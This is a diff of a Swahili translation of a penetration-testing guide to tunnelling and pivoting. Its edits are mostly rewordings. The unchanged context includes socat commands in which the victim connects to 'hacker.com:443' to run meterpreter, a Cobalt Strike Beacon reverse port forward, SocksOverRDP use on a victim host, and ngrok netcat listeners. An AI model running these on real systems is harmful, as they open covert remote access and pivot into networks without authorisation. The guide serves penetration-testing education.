@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-Unahitaji **root katika vifaa vyote viwili** (kama unavyotaka kuunda interfaces mpya) na usanidi wa sshd lazima uruhusu kuingia kwa root:\
+Unahitaji **root katika vifaa vyote viwili** (kama unavyotaka kuunda interfaces mpya) na usanidi wa sshd lazima uruhusu kuingia kama root:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Usalama – Shambulio la Terrapin (CVE-2023-48795)**
-> Shambulio la kupunguza la Terrapin la mwaka 2023 linaweza kumruhusu mtu aliye katikati kubadilisha mkutano wa awali wa SSH na kuingiza data katika **kila channel iliyosambazwa** ( `-L`, `-R`, `-D` ). Hakikisha mteja na seva zote zimepatishwa (**OpenSSH ≥ 9.6/LibreSSH 6.7**) au wazi wazi zima algorithimu hatarishi `chacha20-poly1305@openssh.com` na `*-etm@openssh.com` katika `sshd_config`/`ssh_config` kabla ya kutegemea SSH tunnels.
+> Shambulio la kupunguza la Terrapin la mwaka 2023 linaweza kumruhusu mtu katikati kuingilia kati mkutano wa awali wa SSH na kuingiza data katika **kila channel iliyosambazwa** ( `-L`, `-R`, `-D` ). Hakikisha mteja na seva zote zimepatishwa (**OpenSSH ≥ 9.6/LibreSSH 6.7**) au wazi wazi zima algorithimu dhaifu `chacha20-poly1305@openssh.com` na `*-etm@openssh.com` katika `sshd_config`/`ssh_config` kabla ya kutegemea SSH tunnels.
 
 ## SSHUTTLE
 
@@ -156,8 +156,8 @@ rportfwd stop [bind port]
 ```
 Ili kuzingatia:
 
-- Reverse port forward ya Beacon imeundwa ili **kufanya tunnel trafiki kwa Team Server, sio kwa kuhamasisha kati ya mashine binafsi**.
-- Trafiki **inafanywa tunnel ndani ya trafiki ya C2 ya Beacon**, ikiwa ni pamoja na viungo vya P2P.
+- Reverse port forward ya Beacon imeundwa ili **kufanya tunneling ya trafiki kwa Team Server, sio kwa kuhamasisha kati ya mashine binafsi**.
+- Trafiki **inafanywa tunneling ndani ya trafiki ya C2 ya Beacon**, ikiwa ni pamoja na viungo vya P2P.
 - **Haki za Admin hazihitajiki** kuunda reverse port forwards kwenye bandari za juu.
 
 ### rPort2Port local
@@ -223,7 +223,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Kuunganisha na Kusikiliza kwa Wakala
+### Kuweka na Kusikiliza kwa Wakala
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -290,12 +290,10 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Unaweza kupita **proxy isiyo na uthibitisho** ukitekeleza mstari huu badala ya wa mwisho kwenye konso ya mwathirika:
+Unaweza kupita **proxy isiyo na uthibitisho** ukitekeleza mstari huu badala ya ule wa mwisho kwenye konso ya mwathirika:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
-[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
-
 ### SSL Socat Tunnel
 
 **/bin/sh console**
@@ -358,7 +356,7 @@ Katika kompyuta yako ya mteja, pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavy
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Sasa tunaweza **kuunganisha** na **mhasiriwa** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **kiashiria** kinachosema kwamba **SocksOverRDP plugin imewezeshwa**, na itakuwa **inaskiliza** kwenye **127.0.0.1:1080**.
+Sasa tunaweza **kuunganisha** na **mhasiriwa** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **kipeperushi** kinachosema kwamba **SocksOverRDP plugin imewezeshwa**, na itakuwa **inaskiliza** kwenye **127.0.0.1:1080**.
 
 **Unganisha** kupitia **RDP** na pakia & tekeleza kwenye mashine ya mhasiriwa `SocksOverRDP-Server.exe` binary:
 ```
@@ -396,8 +394,8 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Sasa, ikiwa utaweka kwa mfano katika mwathirika huduma ya **SSH** kusikiliza kwenye bandari 443. Unaweza kuungana nayo kupitia bandari ya mshambuliaji 2222.\
-Unaweza pia kutumia **meterpreter** inayounganisha na localhost:443 na mshambuliaji anasikiliza kwenye bandari 2222.
+Sasa, ikiwa utaweka kwa mfano katika mwathirika huduma ya **SSH** kusikiliza katika bandari 443. Unaweza kuungana nayo kupitia bandari ya mshambuliaji 2222.\
+Pia unaweza kutumia **meterpreter** inayounganisha na localhost:443 na mshambuliaji anasikiliza katika bandari 2222.
 
 ## YARP
 
@@ -510,7 +508,7 @@ _Ipo pia uwezekano wa kuongeza uthibitisho na TLS, ikiwa ni lazima._
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-#### Kuonyesha faili kwa HTTP
+#### Kuweka wazi faili kwa HTTP
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -574,11 +572,11 @@ Anza kiunganishi:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Kwa sababu trafiki yote inatoka kwenye mwenyeji **nje kupitia 443**, Cloudflared tunnels ni njia rahisi ya kupita ACLs za kuingia au mipaka ya NAT. Kuwa makini kwamba binary kawaida inafanya kazi na mamlaka ya juu – tumia kontena au bendera `--user` inapowezekana.
+Kwa sababu trafiki yote inatoka kwenye mwenyeji **nje kupitia 443**, Cloudflared tunnels ni njia rahisi ya kupita ACLs za kuingia au mipaka ya NAT. Kuwa makini kwamba binary kawaida inafanya kazi na ruhusa za juu – tumia kontena au lippu `--user` inapowezekana.
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) ni proxy ya nyuma ya Go inayoshughulikiwa kwa ufanisi ambayo inasaidia **TCP, UDP, HTTP/S, SOCKS na P2P NAT-hole-punching**. Kuanzia na **v0.53.0 (Mei 2024)** inaweza kutenda kama **SSH Tunnel Gateway**, hivyo mwenyeji wa lengo anaweza kuanzisha tunnel ya nyuma kwa kutumia tu mteja wa kawaida wa OpenSSH – hakuna binary ya ziada inahitajika.
+[`frp`](https://github.com/fatedier/frp) ni proxy ya nyuma ya Go inayosimamiwa kwa ufanisi ambayo inasaidia **TCP, UDP, HTTP/S, SOCKS na P2P NAT-hole-punching**. Kuanzia na **v0.53.0 (Mei 2024)** inaweza kutenda kama **SSH Tunnel Gateway**, hivyo mwenyeji wa lengo anaweza kuanzisha tunnel ya nyuma kwa kutumia tu mteja wa kawaida wa OpenSSH – hakuna binary ya ziada inahitajika.
 
 ### Classic reverse TCP tunnel
 ```bash
